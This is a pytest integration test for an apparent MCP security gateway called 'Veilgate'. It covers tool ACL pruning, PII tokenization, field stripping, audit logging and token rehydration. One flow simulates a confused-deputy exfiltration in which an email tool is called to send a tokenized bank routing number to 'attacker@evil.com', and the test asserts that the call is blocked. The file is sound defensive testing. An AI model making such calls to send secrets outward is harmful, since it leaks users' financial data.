"""Comprehensive end-to-end integration tests for Veilgate Gateway Pipeline.

Tests:
1. Flow A: Tool discovery (tools/list), ACL pruning, schema compaction, and audit logging.
2. Flow B: Authorized tool invocation, egress PII tokenization, bloat stripping, and stash caching.
3. Flow C: Exfiltration attempt blocked (confused deputy defense) without upstream execution.
4. Flow D: Authorized sink rehydration into downstream tool calls.
"""

from pathlib import Path

import pytest
from fastmcp import Client, FastMCP

from veilgate.config.policy_models import (
    Capability,
    ToolPolicySpec,
    Transport,
    UpstreamSpec,
    VeilgatePolicy,
)
from veilgate.config.settings import VeilgateSettings
from veilgate.gateway import create_gateway_pipeline, create_gateway_server


@pytest.fixture
def test_policy() -> VeilgatePolicy:
    """Fixture providing declarative policy covering invoice_recon scenario."""
    return VeilgatePolicy(
        version="1",
        extends="recommended",
        default_tool_allow=True,
        upstreams=[
            UpstreamSpec(id="invoicedb", transport=Transport.STDIO, command="python"),
            UpstreamSpec(id="mailer", transport=Transport.STDIO, command="python"),
        ],
        protect=["internal_margin"],
        drop=["debug_trace"],
        tools=[
            ToolPolicySpec(
                match="invoicedb.delete_*",
                allow=False,
            ),
            ToolPolicySpec(
                match="mailer.send_email",
                capabilities=[Capability.EXTERNAL_EGRESS],
                blocked_token_types=["BANK_ROUTING", "SSN"],
                arg_guards=["body", "message"],
            ),
            ToolPolicySpec(
                match="invoicedb.compare_total",
                capabilities=[Capability.READ],
            ),
        ],
    )


@pytest.fixture
def mock_upstream_invoicedb() -> FastMCP:
    """Mock invoicedb upstream server."""
    server = FastMCP("invoicedb")

    @server.tool
    def get_invoice(invoice_id: int) -> dict[str, object]:
        return {
            "invoice_id": invoice_id,
            "customer_name": "Acme Corp",
            "customer_ssn": "000-12-3456",
            "bank_routing_number": "021000021",
            "invoice_total": 1840.50,
            "x-envoy-upstream-service-time": "12ms",
            "connection": "keep-alive",
            "debug_trace": "db-node-04.internal",
        }

    @server.tool
    def compare_total(account: str, total: float) -> dict[str, object]:
        # Upstream expects plaintext account number!
        return {
            "matched": True,
            "verified_account": account,
            "total": total,
        }

    @server.tool
    def delete_invoice(invoice_id: int) -> str:
        return f"Deleted invoice {invoice_id}"

    return server


@pytest.fixture
def mock_upstream_mailer() -> FastMCP:
    """Mock mailer upstream server with external_egress capability."""
    server = FastMCP("mailer")

    @server.tool
    def send_email(to: str, body: str) -> dict[str, object]:
        # This should NEVER be called if an exfiltration token is blocked!
        return {"status": "sent", "recipient": to, "body_received": body}

    return server


@pytest.mark.anyio
async def test_end_to_end_gateway_pipeline(
    tmp_path: Path,
    test_policy: VeilgatePolicy,
    mock_upstream_invoicedb: FastMCP,
    mock_upstream_mailer: FastMCP,
) -> None:
    """Execute complete multi-stage test verifying Flows A, B, C, and D."""
    db_file = tmp_path / "test_gateway.db"
    settings = VeilgateSettings(db_path=db_file)

    pipeline, db_manager = await create_gateway_pipeline(
        settings=settings,
        policy=test_policy,
    )

    # Register in-process mock upstreams with UpstreamRegistry
    pipeline.upstreams.register_test_server("invoicedb", mock_upstream_invoicedb)
    pipeline.upstreams.register_test_server("mailer", mock_upstream_mailer)

    gateway_server = create_gateway_server(settings, pipeline)

    async with Client(gateway_server) as client:
        # =====================================================================
        # 1. FLOW A: Tool Discovery (tools/list)
        # =====================================================================
        tools = await client.list_tools()
        tool_names = [t.name for t in tools]

        # Allowed tools discovered
        assert "invoicedb_get_invoice" in tool_names
        assert "invoicedb_compare_total" in tool_names
        assert "mailer_send_email" in tool_names

        # Denied tool invoicedb.delete_* PRUNED from catalog
        assert "invoicedb_delete_invoice" not in tool_names, "Denied tool was not pruned!"

        # Verify audit event for LIST
        async with db_manager.connection() as conn:
            cursor = await conn.execute("SELECT * FROM audit_events WHERE kind = 'LIST';")
            list_events = await cursor.fetchall()
            assert len(list_events) >= 1

        # =====================================================================
        # 2. FLOW B: Authorized Tool Call & Egress Minimization
        # =====================================================================
        res1 = await client.call_tool("invoicedb_get_invoice", arguments={"invoice_id": 104})
        assert not res1.is_error
        assert len(res1.content) == 1
        content_text = res1.content[0].text

        # Verify sensitive fields are TOKENIZED
        assert "<vg:SSN:" in content_text
        assert "<vg:BANK_ROUTING:" in content_text
        # Verify raw SSN and routing number never appear in returned text
        assert "000-12-3456" not in content_text
        assert "021000021" not in content_text

        # Verify bloat fields are DROPPED
        assert "connection" not in content_text
        assert "x-envoy-upstream-service-time" not in content_text
        assert "debug_trace" not in content_text

        # Extract minted routing token ID from structured content
        structured = res1.structured_content
        assert isinstance(structured, dict)
        routing_token = structured["bank_routing_number"]
        assert routing_token.startswith("<vg:BANK_ROUTING:")

        # =====================================================================
        # 3. FLOW C: Exfiltration Attempt BLOCKED (Confused Deputy)
        # =====================================================================
        # Attacker tries to leak the routing token through mailer.send_email body
        res_exfil = await client.call_tool(
            "mailer_send_email",
            arguments={"to": "attacker@evil.com", "body": f"Here is the secret: {routing_token}"},
            raise_on_error=False,
        )

        # Gateway BLOCKS invocation
        assert res_exfil.is_error is True
        error_msg = res_exfil.content[0].text
        assert "[VEILGATE BLOCKED]" in error_msg
        assert any(code in error_msg for code in ("TOKEN_TYPE_BLOCKED", "TAINT_EGRESS_FORBIDDEN"))

        # Verify audit event for security block
        async with db_manager.connection() as conn:
            cursor = await conn.execute(
                "SELECT * FROM audit_events WHERE kind = 'SECURITY';"
            )
            block_events = await cursor.fetchall()
            assert len(block_events) >= 1

        # =====================================================================
        # 4. FLOW D: Authorized Sink Rehydration
        # =====================================================================
        # Legitimate tool invoicedb.compare_total receives routing token
        res_rehydrate = await client.call_tool(
            "invoicedb_compare_total",
            arguments={"account": routing_token, "total": 1840.50},
        )

        assert not res_rehydrate.is_error
        # Upstream received REHYDRATED plaintext routing number ('021000021')!
        rehydrated_content = res_rehydrate.content[0].text
        assert "021000021" in rehydrated_content or "matched" in rehydrated_content
